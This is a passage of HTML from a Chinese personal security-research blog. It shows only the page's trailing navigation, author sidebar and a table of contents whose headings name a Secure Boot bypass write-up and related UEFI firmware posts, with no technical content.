href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/11/06/CVE-2025-4275-Insyde-%E8%AF%81%E4%B9%A6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="/img/5s.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CVE-2025-4275 Insyde 证书注入漏洞复现</div></div></a></div><div class="next-post pull-right"><a href="/2025/09/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%82%AA%E4%BF%AE%E5%AE%9E%E9%AA%8C%E4%B9%8BAFU-AMI-Firmware-Update-Patch/"><img class="next-cover" src="/img/5s.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">记一次邪修实验之AFU(AMI Firmware Update) Patch</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ivy</div><div class="author-info__description">BUPT | School of Cyberspace Security</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1vyyyyyy"><i class="fab fa-github"></i><span>我的Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/1vyyyyyy" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ivygetshe11@bupt.edu.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1258294332&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">个人学习笔记，欢迎与我交流学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSI-Bomb-Shell-%E2%80%94%E2%80%94-%E4%BD%A0%E7%9A%84%E6%8C%87%E9%92%88%E6%97%A0%E5%A4%84%E9%81%81%E5%BD%A2"><span class="toc-number">1.</span> <span class="toc-text">MSI Bomb Shell —— 你的指针无处遁形</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8Secure-Boot%E5%BC%80%E5%90%AF%E6%83%85%E5%86%B5%E4%B8%8B%E5%8F%AF%E6%89%A7%E8%A1%8Cmm%E8%BF%99%E7%B1%BB%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">在Secure Boot开启情况下可执行mm这类命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E4%B8%AD%E6%9A%B4%E9%9C%B2%E7%9A%84Protocol-Interface%E6%8C%87%E9%92%88"><span class="toc-number">1.2.</span> <span class="toc-text">内存中暴露的Protocol Interface指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Hook%E9%AA%8C%E8%AF%81%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0Secure-Boot%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">通过Hook验证函数实现Secure Boot绕过</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/17/%E5%A4%B1%E8%B8%AA%E4%BA%BA%E5%8F%A3%E5%9B%9E%E5%BD%92/" title="失踪人口回归">失踪人口回归</a><time datetime="2026-03-17T02:25:57.000Z" title="Created 2026-03-17 10:25:57">2026-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/06/CVE-2025-4275-Insyde-%E8%AF%81%E4%B9%A6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2025-4275 Insyde 证书注入漏洞复现">CVE-2025-4275 Insyde 证书注入漏洞复现</a><time datetime="2025-11-06T09:31:05.000Z" title="Created 2025-11-06 17:31:05">2025-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%EF%BC%88%E7%9C%9F%EF%BC%89%E9%82%AA%E4%BF%AE%E5%AE%9E%E9%AA%8C%E4%B9%8BMSI-Bomb-Shell/" title="记一次（真）邪修实验之MSI Bomb Shell">记一次（真）邪修实验之MSI Bomb Shell</a><time datetime="2025-10-15T07:51:35.000Z" title="Created 2025-10-15 15:51:35">2025-10-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%82%AA%E4%BF%AE%E5%AE%9E%E9%AA%8C%E4%B9%8BAFU-AMI-Firmware-Update-Patch/" title="记一次邪修实验之AFU(AMI Firmware Update) Patch">记一次邪修实验之AFU(AMI Firmware Update) Patch</a><time datetime="2025-09-23T01:16:50.000Z" title="Created 2025-09-23 09:16:50">2025-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/07/FakeSecureBoot%E2%80%94%E2%80%94%E4%B8%80%E7%A7%8D%E7%AE%80%E5%8D%95%E7%9A%84UEFI-Hook/" title="FakeSecureBoot——一种简单的UEFI Hook">FakeSecureBoot——一种简单的UEFI Hook</a><time datetime="2025-06-07T10:26:33.000Z" title="Created 2025-06-07 18:26:33">2025-06-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By Ivy</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
